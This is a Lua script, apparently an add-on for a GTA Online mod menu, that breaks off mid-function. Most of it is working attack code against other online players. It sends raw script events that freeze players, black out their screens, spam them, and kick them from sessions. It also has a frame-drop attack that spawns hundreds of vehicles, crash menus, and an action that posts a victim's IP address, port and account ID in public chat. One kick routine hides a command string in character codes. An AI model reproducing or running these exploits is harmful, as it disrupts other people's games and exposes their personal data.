local function getClosestPlayerWithRange_Whitelist(range)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = getEntityCoords(getLocalPed())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
            if not AIM_WHITELIST[playerID] then 
                tbl[#tbl+1] = handle
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= getLocalPed() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = getEntityCoords(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end

local function getClosestNonPlayerPedWithRange(range)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = getEntityCoords(getLocalPed())
    local tbl = {}
    local closest_ped = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            tbl[#tbl+1] = entities.pointer_to_handle(pedPointers[i])
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= getLocalPed() then
                if not PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = getEntityCoords(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_ped = tbl[i]
                    end
                end
            end
        end
    end
    if closest_ped ~= 0 then
        return closest_ped
    else
        return nil
    end
end

local function rqModel (hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        wait(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

local function spawnPedOnPlayer(hash, pid)
    rqModel(hash)
    local lc = getEntityCoords(getPlayerPed(pid))
    local pe = entities.create_ped(26, hash, lc, 0)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    return pe
end

local function spawnObjectOnPlayer(hash, pid)
    rqModel(hash)
    local lc = getEntityCoords(getPlayerPed(pid))
    local ob = entities.create_object(hash, lc)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    return ob
end


local shadow = menu.shadow_root()

local lobbyFeats = menu.list(menuroot, "Lobby", {}, "")


local custselc = menu.list(lobbyFeats, "Lobby Crashes")

local playerss = menu.list(menuroot, "Players")

local protex_ref = menu.ref_by_path("Online>Protections")

local detects_ref = menu.ref_by_path("Online>Protections>Detections")
local detections = protex_ref:list("Stand Expansion", {"detections"}, "More ways of detecting Modders")

local detectaction = menu.action(shadow, "Detections", {}, "Brings you to the Stand Expansion Detection Tab because the LUA API is an Cunt.", function()
    menu.trigger_commands("detections")
end)

local modder_detections = menu.list(detections, "Modder Detections")

local rec_ref = menu.ref_by_path("Online>Quick Progress")

local recovs = rec_ref:list("Stand Expansion", {}, "")

local protects = menu.ref_by_path("Online>Protections")

protects:attachAfter(detectaction)

menu.toggle(playerss, "Exclude Selected", {"excludepussies"}, "If toggled it will select all players apart from selected players.", function(on_toggle)
    if on_toggle then
    excludeselected = true
    else
    excludeselected = false
    end
    end)
    
    selectedplayer = {}
    for b = 0, 31 do
    selectedplayer[b] = false
    end
    excludeselected = false
    
    cmd_id = {}
    for i = 0, 31 do
    cmd_id[i] = 0
    end
    
    local chaos, gravity, speed = false, true, 100
    
    menu.action(playerss, "Go to Players List", {"gotopl"}, "Shotcut for players list.", function()
    menu.trigger_commands("playerlist")
    end)
    
    menu.divider(playerss, "Options")
    
    
    rp_cash_loops = menu.list(playerss, "Cash & RP Loops", {}, "", function(); end)
    
    menu.action(rp_cash_loops, "Give Crazy Loop", {"crazyloopto"}, "Warning! 8 People Max Or Script Will Not Cope.", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    util.yield(2000)
    menu.trigger_commands("crazyloop" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    util.yield(2000)
    menu.trigger_commands("crazyloop" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(rp_cash_loops, "Drop Cash", {"dropcashto"}, "Warning! 8 People Max Or Script Will Not Cope.", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    util.yield(2000)
    menu.trigger_commands("dropcash" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    util.yield(2000)
    menu.trigger_commands("dropcash" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(rp_cash_loops, "Give RP Steadily", {"giverpstedto"}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("giverpsted" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("giverpsted" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(rp_cash_loops, "Give RP Loop", {"giverpto"}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("rp" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("rp" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    helpful_trolling = menu.list(playerss, "Trolling Or Helpful", {}, "", function(); end)
    
    menu.divider(helpful_trolling, "Trolling")
    
    menu.action(helpful_trolling, "Candy Upgrade Vehicle", {"candyvehs"}, "Sets vehicle modifications to pink with candy canes.", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("ugveh" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("ugveh" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Send UFO Attacker", {"sendufo"}, "Sends a ufo to hunt them and kil them.", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("sendufo" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("sendufo" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Bounty All", {}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("bountyall 10000" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("bountyall 10000" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Steal All Vehicles", {"stealall"}, "Spawns a ped to take them out of their vehicle and drive away.", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("steal" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("steal" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Kick From Vehicle", {}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
    menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Kick From Interior", {}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("interiorkick" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("interiorkick" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Ceo Kick", {}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("ceokick" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("ceokick" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Give Sirens", {}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("siren" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("siren" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Give Wanted", {}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("givewanted" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("givewanted" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    
    menu.action(helpful_trolling, "Give Vehicle Godmode Off", {"givegodmodeoffall"}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("invoff" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("invoff" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.divider(helpful_trolling, "Helpful")
    
    menu.action(helpful_trolling, "Give Vehicle Godmode", {"givegodmodeall"}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("invon" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("invon" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Max Player", {"maxall"}, "Turns on auto heal, ceopay, vehiclegodmode, vehicle boost, never wanted, gives all weapons, ammo/infinite and parachute all at once.", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("max" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("max" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(helpful_trolling, "Send Friend Request", {"sendfriend"}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("befriend" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("befriend" .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    tp_players = menu.list(playerss, "Teleports", {}, "", function(); end)
    
    menu.action(tp_players, "TP Players to you", {"tpplayers"}, "Teleports to you.", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    util.yield(2000)
    menu.trigger_commands("summon " .. PLAYER.GET_PLAYER_NAME(pids))
    util.toast("Give them a second to get on..." .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    util.yield(2000)
    menu.trigger_commands("summon " .. PLAYER.GET_PLAYER_NAME(pids))
    util.toast("Give them a second to get on..." .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(tp_players, "TP Players Near Me", {"tpplayersnear"}, "Teleports near to you.", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    util.yield(2000)
    menu.trigger_commands("aptme " .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    util.yield(2000)
    menu.trigger_commands("aptme " .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(tp_players, "TP Players To Casino", {"autocasinoall"}, "It will send your selected players to the table.", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("autocasino " .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("autocasino " .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(tp_players, "TP Players To Their Waypoint", {"towaypoints"}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("wptp " .. PLAYER.GET_PLAYER_NAME(pids))
    util.toast("Teleporting..." .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("wptp " .. PLAYER.GET_PLAYER_NAME(pids))
    util.toast("Teleporting..." .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(tp_players, "TP Players To My Waypoint", {"tomywaypoint"}, "", function()
    for pids = 0, 31 do
    if excludeselected then
    if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("wpsummon " .. PLAYER.GET_PLAYER_NAME(pids))
    util.toast("Teleporting..." .. PLAYER.GET_PLAYER_NAME(pids))
    end
    else
    if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
    menu.trigger_commands("wpsummon " .. PLAYER.GET_PLAYER_NAME(pids))
    util.toast("Teleporting..." .. PLAYER.GET_PLAYER_NAME(pids))
    end
    end
    end
    end)
    
    menu.action(tp_players, "TP Player To MazeBank", {"tpplayersmazebank"}, "", function()
    menu.trigger_commands("apt90all " .. PLAYER.GET_PLAYER_NAME(pids))
    end)
    
    menu.divider(playerss, "Cunts")
    
    for pids = 0, 31 do
    if players.exists(pids) then
    cmd_id[pids] = menu.toggle(playerss, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "Player ID - ".. pids, function(on_toggle)
    if on_toggle then
    selectedplayer[pids] = true
    else
    selectedplayer[pids] = false
    end
    end)
    end
    end

function set_up_player_actions(pid)

local crash_root = menu.shadow_root():list('Stand Expansion')

local kick_root = menu.shadow_root():list('Stand Expansion')

local troll_root = menu.shadow_root():list('Stand Expansion')
troll_root = menu.player_root(pid):refByRelPath("Trolling"):getChildren()[1]:attachBefore(troll_root)

local crash2_ref = menu.player_root(pid):refByRelPath("Crash")
local kick2_ref = menu.player_root(pid):refByRelPath("Kick")

local krustykrab = crash2_ref:list("Mr. Krabs", {}, "Spectating is risky, watch out: works on 2T1 users (prob not lol)")

local nmcrashes = crash2_ref:list("More model crashes", {}, "")

--------------------------------------------------------------------------------------------------------

local cages = troll_root:list("Cages", {}, "")

cages:action("Electric cage", {"electriccage"}, "", function(cl)
    local number_of_cages = 6
    local elec_box = util.joaat("prop_elecbox_12")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    pos.z -= 0.5
    ryze.request_model(elec_box)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(2.5)
        obj_pos:add(pos)
        for offs_z = 1, 5 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            spawned_objects[#spawned_objects + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
            obj_pos.z += 0.75
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
    end
end)

cages:action("Queen Elizabeth's cage", {""}, "", function(cl)
    local number_of_cages = 6
    local coffin_hash = util.joaat("prop_coffin_02b")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    STREAMING.REQUEST_MODEL(coffin_hash)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(0.8)
        obj_pos:add(pos)
        obj_pos.z += 0.1
       local coffin = entities.create_object(coffin_hash, obj_pos)
       spawned_objects[#spawned_objects + 1] = coffin
       ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
       ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
    end
end)

cages:action("Container", {"cage"}, "", function()
    local container_hash = util.joaat("prop_container_ld_pu")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    STREAMING.REQUEST_MODEL(container_hash)
    pos.z -= 1
    local container = entities.create_object(container_hash, pos, 0)
    spawned_objects[#spawned_objects + 1] = container
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end)

cages:action("Knife Cage", { "" }, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local hash = util.joaat("bkr_prop_moneypack_03a")
    STREAMING.REQUEST_MODEL(hash)

    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false)
    local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false)
    local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false)
    local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false)

    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false)
    local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false)
    local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false)
    local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false)

    local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false)
    util.yield(15)
    local rot = ENTITY.GET_ENTITY_ROTATION(cage_object)
    rot.y     = 90
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

cages:action("Christmas Cage", { "" }, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local hash = util.joaat("ch_prop_tree_02a")
    STREAMING.REQUEST_MODEL(hash)

    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false)
    local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false)
    local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false)
    local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false)
    local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false)
    util.yield(15)

    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

cages:action("Clear cages", {"clearcages"}, "", function()
    local entitycount = 0
    for i, object in ipairs(spawned_objects) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
        entities.delete_by_handle(object)
        spawned_objects[i] = nil
        entitycount += 1
    end
    util.toast("Clear " .. entitycount .. " cages")
end)

--------------------------------------------------------------------------------------------------------

troll_root:toggle_loop("Cyclic Spitfire", { "" }, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)

end)

troll_root:toggle_loop("Water Spray", { "" }, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)

end)
troll_root:toggle_loop("Mixed Prank", { "" }, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false, 0.0)
end)
troll_root:toggle_loop("Black screen for players", { "" }, "", function(on_click)
    util.trigger_script_event(1 << pid,
        { -555356783, pid, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 })
    util.yield(1000)
end)
troll_root:toggle_loop("Freeze V1", { "" }, "", function(on_click)
    util.trigger_script_event(1 << pid, { 0x4868BC31, pid, 0, 0, 0, 0, 0 })
    util.yield(500)
end)
troll_root:toggle_loop("Freeze V2", { "" }, "", function(on_click)
    util.trigger_script_event(1 << pid, { 0x7EFC3716, pid, 0, 1, 0, 0 })
    util.yield(500)
end)
troll_root:toggle_loop("Freeze V3", { "" }, "", function(on_click)

    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
end)

troll_root:toggle_loop("Spam Bombing", { "" }, "", function(on_click)
    util.trigger_script_event(1 << pid, { 0xDA29E2BC, pid, math.random(0, 0xB2), 0, 0, 0 })
    util.yield()
end)

troll_root:toggle_loop("Apartment Invitation Message Bombing", { "" }, "", function(on_click)
    util.trigger_script_event(1 << pid, { 0x4246AA25, pid, math.random(1, 0x6) })
    util.yield()
end)

troll_root:action("Drop frame attack (press more for better effect)", {}, "", function()
    while not STREAMING.HAS_MODEL_LOADED(447548909) do
        STREAMING.REQUEST_MODEL(447548909)
        util.yield(10)
    end
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(447548909, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
end)

troll_root:action("Send Info in Chat", {"sendinf"}, "", function()
local sname = players.get_name(pid)
local srid = players.get_rockstar_id(pid)
local sip = players.get_ip(pid)
local sport = players.get_port(pid)
local smoney = players.get_money(pid)
chat.send_message(
    "Name: " ..sname.. "\nRID: " ..srid.. "\nIP: " ..sip.. "\nPort: " ..sport.. "\nMoney: " ..smoney.. "",
    false,
    true,
    true
    ) 
end)

troll_root:action('Jesus took the car', {'jesusjack'}, 'EMP\'s the car to a halt then spawns a jesus that will carjack the car.\nThis sometimes doesn\'t work when there\'s latency and it may look off on your end.', function()
    local p_hash = util.joaat('U_M_M_Jesus_01')
    util.request_model(p_hash, 2000)
    local tar_ped = pid_to_ped(pid) 
    if tar_ped == players.user_ped() then 
        return 
    end
    local tar_veh = GET_VEHICLE_PED_IS_IN(tar_ped, true) 
    if tar_veh ~= -1 then 
        local c = GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(tar_veh, 0.0, -1.0, 0.0)
        local ped = entities.create_ped(28, p_hash, c, GET_ENTITY_HEADING(tar_veh))
        SET_PED_CAN_RAGDOLL(ped, false)
        SET_PED_CONFIG_FLAG(ped, 366, true)
        SET_ENTITY_INVINCIBLE(ped, true)
        SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        TASK_ENTER_VEHICLE(ped, tar_veh, 1000, -1, 1.0, (1 << 1) | (1 << 3) | (1 << 4) | (1 << 9), '')
        local st_time = os.time()
        while GET_VEHICLE_PED_IS_IN(ped, false) ~= tar_veh do
            if os.time() - st_time >= 5 then 
                notification.red('Could not carjack in time.')
                entities.delete(ped)
                return 
            end
            util.yield()
        end
        notification.darkgreen('Hijack complete')
        TASK_VEHICLE_DRIVE_TO_COORD(ped, tar_veh, math.random(-1000, 1000), math.random(-1000, 1000), 80.0, 100.0, 0, GET_ENTITY_MODEL(tar_veh), 524861, 0.0, 500.0)
    else
        notification.red('Target is not in a car')
    end
end)

---------------------------------------------------------------------------------------------------KICKS-------------------------------------------------------------------------------------------------------------

kick2_ref:action("SE Kick", { "" }, "", function()
    if pid == players.user() then
        util.toast('Dont try to Kick yourself, idiot')
        return
    end
    util.trigger_script_event(1 << pid, { 111242367, pid, -210634234 })
end)

kick2_ref:action("Net Bail Kick", { "" }, "", function()
    if pid == players.user() then
        util.toast('Dont try to Kick yourself, idiot')
        return
    end
    util.trigger_script_event(1 << pid,
        { 0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE)) })
end)

kick2_ref:action("Null Drop Kick", { "" }, "", function()
    if pid == players.user() then
        util.toast('Dont try to Kick yourself, idiot')
        return
    end
    util.trigger_script_event(1 << pid, { 0xB9BA4D30, pid, 0x4, -1, 1, 1, 1 })
end)

kick2_ref:action("Tyrannosaurus Kick", { "" }, "", function()
    if pid == players.user() then
        util.toast('Stupid trying to kick himself?')
        return
    end
    if pid == players.get_host() then
        util.toast('Fool wants to kick the host?')
        return
    end

    local cur_crash_meth = ""
    local cur_crash = ""
    for a, b in pairs(crash_tbl_2) do
        cur_crash = ""
        for c, d in pairs(b) do
            cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
        end
        cur_crash_meth = cur_crash_meth .. cur_crash
    end
    local crash_keys = { "NULL", "VOID", "NaN", "127563/0", "NIL" }
    local crash_table = { 109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097,
        110, 100, 115, 040 }
    local crash_str = ""
    for k, v in pairs(crash_table) do
        crash_str = crash_str .. string.char(crash_table[k])
    end
    for k, v in pairs(crash_keys) do
        print(k + (k * 128))
    end
    c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    request_model_load(kitteh_hash)
    local kitteh = entities.create_ped(28, kitteh_hash, c, math.random(0, 270))
    AUDIO.PLAY_PAIN(kitteh, 7, 0)
